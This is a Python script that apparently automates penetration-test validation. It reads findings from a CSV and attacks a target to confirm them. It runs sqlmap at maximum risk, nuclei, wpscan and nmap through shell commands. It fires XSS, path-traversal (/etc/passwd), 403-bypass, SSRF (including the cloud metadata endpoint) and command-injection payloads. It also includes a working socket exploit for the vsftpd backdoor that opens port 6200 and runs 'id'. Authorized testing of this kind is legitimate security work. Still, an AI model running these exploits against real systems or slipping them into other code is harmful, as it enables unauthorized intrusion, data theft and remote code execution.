import sys
import csv
import os
import subprocess
import re
import requests
import socket
import urllib.parse
import time
import base64

import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Clean ANSI codes
ansi_escape = re.compile(r'\x1B(?:[@-Z\\-_]|\[[0-?]*[ -/]*[@-~])')

def clean_ansi(text):
    return ansi_escape.sub('', text)

def extract_evidence(text):
    if not text:
        return ""
    text = clean_ansi(text)
    return text[-800:].strip()

CMD_CACHE = {}
NMAP_CACHE = {}

def run_command(cmd, timeout=60, retry=True):
    if cmd in CMD_CACHE:
        return CMD_CACHE[cmd]
    try:
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=timeout)
        output = result.stdout + "\n" + result.stderr
        CMD_CACHE[cmd] = output
        return output
    except subprocess.TimeoutExpired as e:
        if retry:
            return run_command(cmd, timeout=timeout * 2, retry=False)
        return "TIMEOUT"
    except Exception as e:
        return str(e)

def extract_injectable_url(row, target_ip):
    desc = row.get('description', '') + ' ' + row.get('url_or_port', '')
    urls = re.findall(r'https?://[^\s<"]+\?[^\s<"]+', desc)
    if urls:
        return urls[0]
    
    port_match = re.search(r'\b(80|443|8080|8443)\b', desc)
    port = port_match.group(1) if port_match else "80"
    scheme = "https" if port in ["443", "8443"] else "http"
    
    if "phpmyadmin" in desc.lower():
        return f"{scheme}://{target_ip}:{port}/phpmyadmin/"
    
    if "wordpress" in desc.lower():
        return f"{scheme}://{target_ip}:{port}/"

    return f"{scheme}://{target_ip}:{port}/index.php?id=1"

def extract_port(row):
    port_match = re.search(r'\b(21|22|80|443|445|512|513|8080|8443|8787)\b', row.get('url_or_port', ''))
    if port_match:
        return port_match.group(1)
    return "80"

# LAYER 1: NUCLEI
def layer_1_nuclei(cve_list, target):
    for cve in cve_list:
        cmd = f"nuclei -id {cve} -target {target}"
        out = run_command(cmd)
        if "matched" in out.lower() or "leak" in out.lower() or "[vulnerable]" in out.lower() or "extracted" in out.lower():
            return "REPRODUCED", cmd, f"Nuclei success for {cve}:\n" + extract_evidence(out)
    return None, None, None

# LAYER 2A: SQLi
def layer_2a_sqli(url, desc):
    cmd = f"sqlmap -u '{url}' --level 3 --risk 3 --batch --forms --crawl=2"
    out = run_command(cmd, timeout=120)
    if "is vulnerable" in out.lower() or "injectable" in out.lower() or ("parameter" in out.lower() and "appears to be" in out.lower()):
        return "REPRODUCED", cmd, "SQLMap found vulnerability:\n" + extract_evidence(out)
    
    if "wordpress" in desc.lower():
        cmd2 = f"wpscan --url {url} --enumerate vp,vt,tt,u"
        out2 = run_command(cmd2, timeout=120)
        if "vulnerabilities identified" in out2.lower() and "[+]" in out2:
            return "REPRODUCED", cmd2, "WPScan found vulnerabilities:\n" + extract_evidence(out2)
            
    return None, None, None

# LAYER 2B: XSS
def layer_2b_xss(url):
    payloads = ['<script>alert(1)</script>', '"><img src=x onerror=alert(1)>', '{{7*7}}', '<svg/onload=alert(1)>', 'javascript:alert(1)']
    
    for payload in payloads:
        try:
            if '?' in url:
                base, params = url.split('?', 1)
                new_params = []
                for p in params.split('&'):
                    if '=' in p:
                        k, v = p.split('=', 1)
                        new_params.append(f"{k}={urllib.parse.quote(payload)}")
                    else:
                        new_params.append(p)
                test_url = base + '?' + '&'.join(new_params)
            else:
                test_url = url + payload
            
            res = requests.get(test_url, timeout=10, verify=False)
            if payload in res.text:
                return "REPRODUCED", f"requests.get('{test_url}')", f"XSS payload {payload} reflected unencoded at {test_url}"
        except:
            pass

    cmd = f"nuclei -tags xss -target {url}"
    out = run_command(cmd)
    if "matched" in out.lower() or "extracted" in out.lower():
        return "REPRODUCED", cmd, "Nuclei XSS success:\n" + extract_evidence(out)

    return None, None, None

# LAYER 3A: 403 Bypass & Path Traversal
def layer_3a_lfi(url):
    # 403 Bypass headers
    headers_list = [
        {'X-Forwarded-For': '127.0.0.1'},
        {'X-Custom-IP-Authorization': '127.0.0.1'},
        {'X-Original-URL': '/admin'}
    ]
    # Path traversal payloads
    payloads = [
        '../../../etc/passwd', '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
        '../../../../windows/win.ini', '/etc/passwd',
        '/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/etc/passwd'
    ]
    for p in payloads:
        try:
            urls_to_test = [url + "/" + p]
            if '?' in url:
                base, params = url.split('?', 1)
                for param in params.split('&'):
                    if '=' in param:
                        k, v = param.split('=', 1)
                        urls_to_test.append(base + f"?{k}={p}")
            
            for t_url in urls_to_test:
                res = requests.get(t_url, timeout=10, verify=False)
                if 'root:x:0:0' in res.text or '[extensions]' in res.text.lower():
                    return "REPRODUCED", f"requests.get('{t_url}')", f"LFI success with {p} on {t_url}"
                
                for h in headers_list:
                    res = requests.get(t_url, headers=h, timeout=10, verify=False)
                    if 'root:x:0:0' in res.text or '[extensions]' in res.text.lower():
                        return "REPRODUCED", f"requests.get('{t_url}', headers={h})", f"403 Bypass + LFI success with {p} on {t_url}"
        except:
            pass
    return None, None, None

# LAYER 3B: SSRF
def layer_3b_ssrf(url):
    payloads = ['http://127.0.0.1:80/', 'http://localhost/', 'http://169.254.169.254/latest/meta-data/', 'file:///etc/passwd']
    if '?' in url:
        base, params = url.split('?', 1)
        for p in payloads:
            try:
                new_params = []
                for param in params.split('&'):
                    if '=' in param:
                        k, v = param.split('=', 1)
                        new_params.append(f"{k}={urllib.parse.quote(p)}")
                    else:
                        new_params.append(param)
                test_url = base + '?' + '&'.join(new_params)
                res = requests.get(test_url, timeout=10, verify=False)
                if 'root:x:0:0' in res.text or 'ami-id' in res.text or 'instance-id' in res.text or (res.status_code == 200 and len(res.text) != 0 and p != 'http://127.0.0.1:80/'):
                    return "REPRODUCED", f"requests.get('{test_url}')", f"SSRF success with {p} on {test_url}"
            except:
                pass
    return None, None, None

# LAYER 4: NMAP
def layer_4_nmap(target_ip, port):
    cmd = f"nmap -sV -Pn -p {port} --script vulners,ssh2-enum-algos,ssl-enum-ciphers {target_ip}"
    if cmd not in NMAP_CACHE:
        NMAP_CACHE[cmd] = run_command(cmd)
    out = NMAP_CACHE[cmd]
    
    if "VULNERABLE:" in out or "State: VULNERABLE" in out:
        return "CONFIRMED_PRESENT", cmd, "Nmap exploit path confirmed:\n" + extract_evidence(out)
    if "weak" in out.lower() or "downgrade" in out.lower() or "deprecated" in out.lower():
        return "CONFIRMED_PRESENT", cmd, "Nmap weak config with exploit path:\n" + extract_evidence(out)
    return "CHECKED_NO_EXPLOIT", cmd, "Nmap found version/banner but no clear exploit path:\n" + extract_evidence(out)

# LAYER 5: Protocol PoC
def layer_5_protocol(target_ip, port):
    port = int(port) if str(port).isdigit() else 0
    if port == 21: # vsftpd backdoor
        try:
            s = socket.socket()
            s.settimeout(5)
            s.connect((target_ip, port))
            s.recv(1024)
            s.send(b"USER x:)\r\n")
            s.recv(1024)
            s.send(b"PASS pass\r\n")
            s.close()
            time.sleep(1)
            # check 6200
            s2 = socket.socket()
            s2.settimeout(5)
            s2.connect((target_ip, 6200))
            s2.send(b"id\n")
            res = s2.recv(1024).decode()
            if "uid=" in res:
                return "REPRODUCED", "Python socket vsftpd backdoor", f"vsftpd backdoor exploited! uid={res}"
        except:
            pass
    elif port == 512 or port == 513:
        pass # Not deeply implemented, fallback below
    elif port == 445:
        cmd = f"smbclient -L //{target_ip} -N"
        out = run_command(cmd)
        if "Sharename" in out:
            return "REPRODUCED", cmd, "SMB null session allowed, shares listed:\n" + extract_evidence(out)
    
    return None, None, None

# LAYER 6: Deserialization & RCE
def layer_6_rce(url):
    payloads = ['; id', '| id', '`id`', '$(id)']
    for p in payloads:
        try:
            res = requests.get(url + p, timeout=10, verify=False)
            if 'uid=' in res.text:
                return "REPRODUCED", f"requests.get('{url + p}')", f"Command injection successful with payload {p}"
        except:
            pass
            
    # Simple Deserialization probe
    cmd = f"nuclei -tags rce,java -target {url}"
    out = run_command(cmd)
    if "matched" in out.lower() or "extracted" in out.lower():
        return "REPRODUCED", cmd, "Nuclei RCE/Deserialization success:\n" + extract_evidence(out)

    return None, None, None

def analyze_row(row, target_ip):
    name = row.get('finding_name', '').lower()
    desc = row.get('description', '').lower()
    cves = re.findall(r'CVE-\d{4}-\d+', row.get('cve', '') + ' ' + name + ' ' + desc, re.IGNORECASE)
    
    url = extract_injectable_url(row, target_ip)
    port = extract_port(row)
    
    # 1. Nuclei
    if cves:
        status, cmd, ev = layer_1_nuclei(cves, url if url.startswith('http') else target_ip)
        if status: return status, cmd, ev
        
    # 2A. SQLi
    if any(k in name or k in desc for k in ['sql', 'injection', 'query', 'database']):
        status, cmd, ev = layer_2a_sqli(url, desc)
        if status: return status, cmd, ev
        
    # 2B. XSS
    if any(k in name or k in desc for k in ['xss', 'cross-site', 'scripting', 'reflected', 'stored']):
        status, cmd, ev = layer_2b_xss(url)
        if status: return status, cmd, ev
        
    # 3A/3B. LFI / SSRF / 403
    if any(k in name or k in desc for k in ['path traversal', 'local file', 'lfi', '403']):
        status, cmd, ev = layer_3a_lfi(url)
        if status: return status, cmd, ev
        
    if any(k in name or k in desc for k in ['ssrf', 'request forgery', 'redirect', 'fetch']):
        status, cmd, ev = layer_3b_ssrf(url)
        if status: return status, cmd, ev
        
    # 6. RCE / Deserialization
    if any(k in name or k in desc for k in ['deseriali', 'unserialize', 'rce', 'remote code', 'command execution', 'code injection', 'object injection']):
        status, cmd, ev = layer_6_rce(url)
        if status: return status, cmd, ev
        
    # 5. Protocol Specialist
    non_http_ports = ['21', '22', '445', '512', '513', '8787']
    if port in non_http_ports or any(k in name or k in desc for k in ['ftp', 'ssh', 'smb', 'rmi', 'druby', 'rlogin', 'rexec']):
        status, cmd, ev = layer_5_protocol(target_ip, port)
        if status: return status, cmd, ev
        
    # 4. Infra (Nmap)
    status, cmd, ev = layer_4_nmap(target_ip, port)
    if status == "CONFIRMED_PRESENT":
        return status, cmd, ev

    # 7. Safety Net
    return "CHECKED_NO_EXPLOIT", "Fallback Analysis", "Fallback: Checked but no exploit path proved."

def main():
    if len(sys.argv) < 2:
        print("Usage: python verify_vulns.py <TARGET>")
        sys.exit(1)
        
    target = sys.argv[1]
    csv_file = "data/output/vuln_validation_queue.csv"
    
    if not os.path.exists(csv_file):
        print(f"File not found: {csv_file}")
        sys.exit(1)
        
    rows = []
    with open(csv_file, 'r', encoding='utf-8') as f:
        reader = csv.DictReader(f)
        fieldnames = reader.fieldnames
        for row in reader:
            rows.append(row)
            
    for i, row in enumerate(rows):
        status = row.get('agent_status', '').strip()
        if status and status.upper() != 'WAITING' and status.upper() != 'NAN':
            continue
            
        print(f"Processing row {i+1}/{len(rows)}: {row.get('finding_name')}")
        
        try:
            final_status, final_cmd, final_evidence = analyze_row(row, target)
        except Exception as e:
            final_status, final_cmd, final_evidence = "ERROR", "Python Script Error", str(e)
            
        row['agent_status'] = final_status
        row['agent_command'] = final_cmd
        row['agent_evidence'] = final_evidence
        
        with open(csv_file, 'w', encoding='utf-8', newline='') as f:
            writer = csv.DictWriter(f, fieldnames=fieldnames)
            writer.writeheader()
            writer.writerows(rows)

if __name__ == "__main__":
    main()
